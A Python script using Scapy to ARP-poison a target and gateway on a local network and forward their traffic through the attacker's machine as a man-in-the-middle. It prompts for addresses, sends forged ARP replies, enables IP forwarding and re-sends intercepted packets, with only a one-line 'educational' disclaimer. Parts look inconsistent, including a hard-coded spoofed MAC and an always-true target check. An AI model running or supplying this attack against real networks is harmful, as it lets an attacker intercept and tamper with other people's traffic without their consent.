"""
ARP Poisoning and Packet Forwarding Script using Scapy

This script performs ARP spoofing (ARP poisoning) to intercept traffic between a target device 
and the gateway on a local network. It sends forged ARP replies to redirect traffic through 
the attacker's machine, enabling Man-In-The-Middle (MITM) attacks.

Features:
- Configurable MAC and IP addresses for attacker, target, and gateway.
- Sends crafted ARP replies to both the target and gateway to poison their ARP caches.
- Sniffs packets from both target and gateway interfaces.
- Rewrites Ethernet headers and forwards packets to maintain network connectivity 
  while intercepting traffic.
- Handles IP fragmentation for larger packets to ensure proper forwarding.
- Enables and disables IP forwarding on the host system to allow routing.

Requirements:
- Python 3
- Scapy library
- Root privileges (to send raw packets and modify system settings)

Note: This script is for educational purposes only. Unauthorized ARP poisoning is illegal and unethical.

Author: Ben
Date: 2025-06
"""

import subprocess
from itertools import count
from time import sleep

import ifaddr
from scapy.layers.inet import IP, fragment
from scapy.layers.l2 import *
from scapy.sendrecv import sniff
import os

"""""00:ff:9b:f4:f3:f4"""""
GATEWAY_IP = "10.10.0.254"
GATEWAY_MAC = "ff:ff:ff:ff:ff:ff"


print("more than 1? 1/0")
targets = input()
print("enter your MAC")
my_mack = str(input())
MY_MAC = my_mack
print("enter your IP")
my_ip = str(input())
MY_IP = my_ip
print("enter TARGET IP")
target_ip = str(input())
TARGET_IP = target_ip
print("enter TARGET MAC")
target_mac = str(input())
TARGET_MAC = target_mac

def arp_poison():
    """generate and send ARP replies"""
    global MY_IP, MY_MAC, TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, targets

    subprocess.run(["arp", "-d"])
    """First ARP"""
    arp_response = ARP(op=2, hwsrc="b4:6b:fc:9d:99:9b", psrc=MY_IP, hwdst=TARGET_MAC,
                       pdst=TARGET_IP)
    ether = Ether(dst=GATEWAY_MAC)
    arp_pkt = ether / arp_response
    sendp(arp_pkt)
    arp_pkt.show()

    if targets == "1":

        """Second ARP"""
        arp_response = ARP(op=2, hwsrc=MY_MAC, psrc=GATEWAY_IP, hwdst=TARGET_MAC,
                           pdst=TARGET_IP)
        ether = Ether(dst=TARGET_MAC)
        arp_pkt = ether / arp_response
        sendp(arp_pkt)
        arp_pkt.show()

    """Third ARP"""
    arp_response = ARP(op=2, hwsrc=MY_MAC, psrc=TARGET_IP, hwdst=GATEWAY_MAC,
                       pdst=GATEWAY_IP)
    ether = Ether(dst=GATEWAY_MAC, src=TARGET_MAC)
    arp_pkt = ether / arp_response
    sendp(arp_pkt)
    arp_pkt.show()
    sleep(2)

def handle_packet_gateway(packet):
    """manually re-establish proper routing simulation"""
    if IP in packet and Ether in packet:
        if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
            packet[Ether].dst = GATEWAY_MAC
            frag_packet = fragment(packet, 500)
            sendp(frag_packet)
            packet.show()
            print("A packet from " + packet[IP].src + " redirected!")
    else:
        packet.show()
        print("Packet does not contain expected layers.")

def handle_packet_target(packet):
    """manually re-establish proper routing simulation"""
    if IP in packet and Ether in packet:
        if (packet[IP].dst == TARGET_IP) and (packet[Ether].dst == MY_MAC):
            packet[Ether].dst = TARGET_MAC
            frag_packet = fragment(packet, 500)
            sendp(frag_packet)
            packet.show()
            print("A packet from " + packet[IP].src + " redirected!")
    else:
        packet.show()
        print("Packet does not contain expected layers.")

def get_interface_by_ip(ip_address):
    adapt = ifaddr.get_adapters()
    for ad in adapt:
        for ip in ad.ips:
            if ip.ip == ip_address:
                return ad.nice_name


try:
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    while True:
        arp_poison()
        if targets:
            pkts = sniff(prn=handle_packet_target, filter="ip", iface="wlp2s0", store=0, count=5)
        sniff(prn=handle_packet_gateway, filter="ip", iface="wlp2s0", store=0, count=5)
finally:
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

